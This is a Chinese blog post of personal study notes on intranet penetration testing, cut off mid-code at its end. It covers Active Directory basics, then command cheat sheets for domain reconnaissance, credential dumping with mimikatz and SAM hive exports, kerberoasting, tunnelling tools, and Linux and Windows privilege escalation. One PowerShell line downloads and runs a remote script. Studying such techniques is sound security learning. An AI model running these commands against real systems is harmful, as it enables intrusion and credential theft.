<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>内网渗透学习 | mayylu&#39;s blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">内网渗透学习</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">七月 10, 2024&nbsp;&nbsp;</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鉴于我在二进制方面还停留在汇编阶段，所以主要还是研究内网体系和工具利用上面，但是我感觉就算不知道具体细节，现阶段也够用</p>
<span id="more"></span>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器(DC)"></a>域控制器(DC)</h3><p>域控制器是域环境中核心的服务器计算机，用于在域中响应安全身份验证请求，负责允许或拒绝发出请求<br>的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息并执行域的安全策略等。</p>
<p><strong>辅域</strong>：通常指的是在网络环境中作为主域控制器备份的域控制器。这些控制器在功能上辅助主域控制器，确保在主域控制器故障时能够接管关键服务</p>
<h3 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h3><p>活动目录是一种目录服务数据库，区别于常见的关系型数据库。目录数据库实现是目录服务，是一个帮助<br>用户快速，准确地从目录中找到所需要信息的服务。目录数据库将所有数据库组织成一个有层次的树状结<br>构，其中的每一个节点是一个对象，用户可以根据这个对象名称去查找这个对象的有关信息。<br><strong>如果那台机器装了AD他就变成DC</strong></p>
<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>从组的使用范围来分，可以分为三种：<strong>全局组</strong>、<strong>本地域组</strong>和<strong>通用组</strong>。</p>
<ol>
<li>域本地组 域本地组主要用于本域内资源的访问权限，如<strong>Administrators：管理员组</strong>,该组的成员对服务器具有完全的控制权，并可以根据需要向用户分配用户权限和访问控制权限。<strong>Account Operators：账号操作员组</strong>，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器</li>
<li>通用组   可以在该域林的任何域中指派权限，适合在域森林内的跨域访问中使用。</li>
<li>全局组   全局组只能包含本域内的用户账户，全局组的使用范围是本域以及受信任关系的其他域。如<strong>Domain Admins，域管理员组</strong>，Domain Users，域用户</li>
</ol>
<p>当服务器加入域时，<strong>域管理员</strong>默认对域内所有机器都具有管理权限，这是因为域的<strong>Domain Admins组</strong>默认会被添加到域内所有机器的本地<strong>Administrators组内</strong>。因为此组可以完全控制服务器。<strong>administrator帐户</strong>是Administrators组的一个默认本地成员,权限默认仅限于本地计算机</p>
<p><strong>域用户账户</strong>是在域内全局组 <strong>Domain Users组</strong>中，本地用户账户在本地 <strong>User组</strong>中。当计算机加入域时，会把 Domain Users组添加到本地的 User 组中。因此域用户默认可以在域中的任何一台计算机上登录</p>
<p><strong>机器用户（也被称为主机账号）</strong>属于域的<strong>Domain Computers组</strong>。‌机器用户是一种特殊的域用户，用户名为机器名加<code>$</code>，如：<code>WIN7$</code>、<code>WINXP$</code>,win的SYSTEM权限就对应于主机的机器用户(system和administrator权限感觉都差不多，但在一些与系统内核交互的细节上，可以看出system权限要更大一些，如<strong>HKEY_LOCAL_MACHINE\SAM</strong>)</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一般实战都是直接上传fscan</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 172.22.1.0/24</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc <span class="comment">#(跳过存活检测 、不保存文件、跳过web poc扫描)</span></span><br><span class="line">cat result.txt</span><br></pre></td></tr></table></figure>
<h3 id="本机基础信息收集"><a href="#本机基础信息收集" class="headerlink" title="本机基础信息收集"></a>本机基础信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM对应是: %SystemRoot%\system32\config\SYSTEM</span><br><span class="line">【system系统注册表文件，存储了系统的配置信息】</span><br><span class="line">HKLM\SAM对应是: %SystemRoot%\system32\config\SAM</span><br><span class="line">【SAM文件是Windows用户的账户数据库】</span><br><span class="line">HKLM\SECURITY对应是:</span><br><span class="line">%SystemRoot%\system32\config\SECURITY</span><br><span class="line">【security中存储了Lsass策略数据库】</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">systeminfo    #查看操作系统信息 </span><br><span class="line">whoami /all   #查看当前用户，权限</span><br><span class="line"></span><br><span class="line">ipconfig /all #查看网络配置信息,linux是ifconfig</span><br><span class="line">netstat -ano  #查看端口连接信息</span><br><span class="line">route print   #查看主机路由信息</span><br><span class="line"></span><br><span class="line">tasklist      #查看当前进程</span><br><span class="line"></span><br><span class="line">net use       # 查看本机建立的连接(本机连接其他机器)</span><br><span class="line">net session   #查看当前主机与所连接的客户端之间的会话, 注意这里需要管理权限</span><br><span class="line">net share                             # 查看本地开启的共享</span><br><span class="line">net share ipc$                        # 开启ipc$共享</span><br><span class="line">net share ipc$ /del                   # 删除ipc$共享</span><br><span class="line">net share admin$ /del                 # 删除admin$共享</span><br><span class="line">net share c$ /del                     # 删除C盘共享</span><br><span class="line"></span><br><span class="line">net user      #查看本地用户/组信息</span><br><span class="line">net user &lt;用户名&gt; &lt;密码&gt; /add</span><br><span class="line">net user &lt;用户名&gt; /delete</span><br><span class="line"></span><br><span class="line">net localgroup administrators #查看本地管理员组</span><br><span class="line">net localgroup administrators fushuling /add #添加用户到该组</span><br><span class="line"></span><br><span class="line">query user #查看在线用户</span><br></pre></td></tr></table></figure>


<h3 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h3><p>需要有域用户的权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net config workstation   #判断是否存在域环境</span><br><span class="line">net time /domain</span><br><span class="line">net user /domain         #域用户信息</span><br><span class="line">net group /domain        #列出域内所有用户组</span><br><span class="line">net group &quot;domain admins&quot; /domain #查看域管组</span><br><span class="line"></span><br><span class="line">net accounts /domain     #域内密码策略</span><br><span class="line">nltest /DCLIST:域名      #查询所有的域控制器的主机名</span><br><span class="line">nltest /domain_trusts    #查看域信任关系</span><br></pre></td></tr></table></figure>
<h4 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h4><p>SPN（ServicePrincipal Names，服务主体名称）是服务实例的唯一标识符，当域内存在大量的服务器，管理员为了方便管理会对服务器进行标识，那么管理员标识所使用的方法就是SPN。<br>SPN分为以下两种类型，一种为注册在活动目录的“机器账户computer”下，另一种为注册在活动目录的“域账号Users”下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找域用户下的spn</span></span><br><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>
<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>ACL 是 <strong>Access Control List（访问控制列表）</strong>的缩写。它是一种用于管理和控制访问权限的机制或数据结构。ACL 用于确定谁可以访问特定资源（例如文件、文件夹、网络资源等）以及他们可以执行的操作<br>一些不安全的acl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GenericAll：完全控制对象，包括更改密码、注册SPN、添加AD对象到目标组里面</span><br><span class="line"> </span><br><span class="line">GenericWrite:更新对象的属性（例如登录脚本）</span><br><span class="line"> </span><br><span class="line">WriteOwner：更新目标对象的所有者，可以更改为攻击者控制的用户，接管对象</span><br><span class="line"> </span><br><span class="line">WriteDACL：更新对面的DACL，将ACL写入对面实体，直接授予我们的账户对对象的完全控制权</span><br><span class="line"> </span><br><span class="line">AllExtendedRights：能够对目标对象执行与扩展 AD 权限相关的任何操作。例如，能够将用户添加到组或重置密码。</span><br><span class="line"></span><br><span class="line">ForceChangePassword：强制改变当下的密码</span><br><span class="line"> </span><br><span class="line">AddMembers：可以对目标组添加用户（包括自己的账户）</span><br><span class="line"></span><br><span class="line">Self (Self-Membership)： 能够将自己添加到组中</span><br><span class="line"></span><br><span class="line">HasSIDHistory: SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限</span><br></pre></td></tr></table></figure>
<h3 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h3><h4 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ICMP探测</span></span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; #对网段循环ping</span><br><span class="line"><span class="meta">#</span><span class="bash">使用powershell脚本进行arp探测</span></span><br><span class="line">set-executionpolicy remotesigned；</span><br><span class="line">Import-Module .\Invoke-ARPScan.ps1</span><br><span class="line">Invoke-ARPScan -CIDR 192.168.92.1/24</span><br><span class="line">powshell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -CIDR 192.168.92.1/24&quot; #也可以将脚本托管在服务器上，并通过powshell远程加载运行</span><br></pre></td></tr></table></figure>
<h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">简单测试指定的端口号</span></span><br><span class="line">nc ip port</span><br><span class="line">telnet &lt;ip&gt; &lt;port&gt; </span><br><span class="line"><span class="meta">#</span><span class="bash">利用MetaSploite探测内网</span></span><br><span class="line">msfconsole</span><br><span class="line">search auxiliary/scanner </span><br></pre></td></tr></table></figure>

<h5 id="Nmap进行端口扫描"><a href="#Nmap进行端口扫描" class="headerlink" title="Nmap进行端口扫描"></a>Nmap进行端口扫描</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR [目标] #当目标主机与我们处于同一个网段的时候，使用ARP协议扫描技术就是最佳的选择</span><br><span class="line">nmap -PE [目标] #通过ICMP响应请求和应答进行主机发现</span><br><span class="line">nmap -sU [目标] #基于UDP协议</span><br><span class="line">nmap -sS [目标] #TCP SYN扫描</span><br><span class="line">nmap -sA [目标] #TCP ACK扫描</span><br><span class="line">nmap -sF [目标] #TCP FIN扫描</span><br><span class="line">nmap -sT [目标] # TCP Connect扫描(完成了三次握手)</span><br><span class="line">nmap -sV [目标] #版本扫描</span><br><span class="line"></span><br><span class="line">nmap -iL targets.txt路径 #扫描主机列表targets.txt中的所有目标地址</span><br></pre></td></tr></table></figure>
<h3 id="收集用户凭证"><a href="#收集用户凭证" class="headerlink" title="收集用户凭证"></a>收集用户凭证</h3><p><strong>SAM文件</strong>是Windows用户的账户数据库,位于%SystemRoot%\System32\Config目录中,所有本地用户的用户名, 密码的哈希值等信息都被存放在这个数据库文件中.</p>
<h4 id="本地用户的密码哈希"><a href="#本地用户的密码哈希" class="headerlink" title="本地用户的密码哈希"></a>本地用户的密码哈希</h4><h5 id="mimikatz读取"><a href="#mimikatz读取" class="headerlink" title="mimikatz读取"></a>mimikatz读取</h5><p>对于较新的 Windows 系统，默认情况下是无法通过 Mimikatz 导出用户明文口令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span> <span class="comment">#从lsass.exe进程的内存中读取当前已登录用户的凭据</span></span><br><span class="line"><span class="comment">#privilege::debug提升至DebugPrivilege权限</span></span><br><span class="line"><span class="comment">#sekurlsa::logonpasswords导出用户凭据</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="built_in">exit</span> <span class="comment">#在线读取本地Sam文件</span></span><br><span class="line"><span class="comment"># privilege::debug,用于提升至DebugPrivilege权限</span></span><br><span class="line"><span class="comment"># token::elevate,提升至system权限</span></span><br><span class="line"><span class="comment"># lsadump::sam,用于读取SAM文件</span></span><br></pre></td></tr></table></figure>
<h5 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br><span class="line">secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure>

<h4 id="从应用中获取信息"><a href="#从应用中获取信息" class="headerlink" title="从应用中获取信息"></a>从应用中获取信息</h4><h5 id="破解xshell"><a href="#破解xshell" class="headerlink" title="破解xshell"></a>破解xshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpXDecrypt.exe</span><br></pre></td></tr></table></figure>
<h2 id="内网穿透与端口转发"><a href="#内网穿透与端口转发" class="headerlink" title="内网穿透与端口转发"></a>内网穿透与端口转发</h2><h3 id="ssh隧道搭建"><a href="#ssh隧道搭建" class="headerlink" title="ssh隧道搭建"></a>ssh隧道搭建</h3><p><code>ssh -L 8085:172.2.118.5:80 ctfshow@pwn.challenge.ctf.show -p 28259</code><br>ctfshow上的题,直接在本地运行即可，作用是通过ssh连接，把内网的172.2.118.5:80映射到本地127.0.0.1:8085</p>
<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe，Linux版为portmap</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"> 功能和上面一样</span></span><br></pre></td></tr></table></figure>
<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">外</span></span><br><span class="line">[common]</span><br><span class="line"><span class="meta">#</span><span class="bash"> frp监听的端口，默认是7000，可以改成其他的</span></span><br><span class="line">bind_port = 7000</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">内</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = vps_ip #你自己vps的外网ip</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[RDP]   #这里演示的是远程桌面协议的端口转发</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389   #要转发的端口</span><br><span class="line">remote_port = 6000  #转发到外网ip的什么端口</span><br></pre></td></tr></table></figure>

<h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><p>前面这几个一次只能转发一个或几个端口,这个可以和proxychains4配合实现，内网kail打内网环境</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse #在vps上运行</span><br><span class="line">./chisel client 123.60.135.22:1234 R:0.0.0.0:9383:socks #1234是建立连接的端口，9383是你设置的代理端口，代理ip还是你自己vps ip</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 vpsip 9383</span><br><span class="line"></span><br><span class="line">proxychains4 msfconsole #使用proxychains4代理运行程序</span><br></pre></td></tr></table></figure>
<p>proxychains4还能让kail科学上网这里不再赘述</p>
<h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1234 -s 123</span><br><span class="line">./linux_x64_agent -c Server_ip:1234 -s 123 --reconnect 8</span><br><span class="line"><span class="comment">#连接成功后在服务器端运行</span></span><br><span class="line">use 0</span><br><span class="line">socks 9383</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">ls -al /usr/bin/su</span><br><span class="line"><span class="meta">#</span><span class="bash">常用提权方式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">find</span></span><br><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br><span class="line"><span class="meta">#</span><span class="bash">cp mv</span></span><br><span class="line"><span class="meta">#</span><span class="bash">覆盖 /etc/shadow 或 /etc/passwd</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">nmap（2.02-5.21）存在交换模式，可利用提权</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash">vi/vim</span></span><br><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">bash</span></span><br><span class="line">bash -p</span><br><span class="line"><span class="meta">#</span><span class="bash">less more</span></span><br><span class="line">less /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
<h4 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h4><p>Capabilities机制是在<strong>Linux内核2.2</strong>之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>
<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。</p>
<p>如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="SUDO滥用提权"><a href="#SUDO滥用提权" class="headerlink" title="SUDO滥用提权"></a>SUDO滥用提权</h4><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l <span class="comment">#列出当前用户可以以超级用户（root）身份执行的命令列表</span></span><br><span class="line"><span class="comment">#https://gtfobins.github.io/ 这里面更加详细</span></span><br><span class="line">sudo mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>gcc -pthread dirty.c -o exp -lcrypt<br> ./exp<br>su firefart </p>
<h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p>只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（<strong>IIS</strong>、**MSSQL(SQL Server的简称)**等）有这个权限，大多数用户级的账户没有这个权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/sweetpotato.exe -a whoami</span><br></pre></td></tr></table></figure>
<h4 id="注册表提权"><a href="#注册表提权" class="headerlink" title="注册表提权"></a>注册表提权</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | fl * <span class="comment">#显示指定注册表项的访问控制列表,查看是否有修改注册表的权限</span></span><br><span class="line"></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="comment">#把本来用户主页点放大镜启动替换为cmd</span></span><br><span class="line"></span><br><span class="line">REG ADD <span 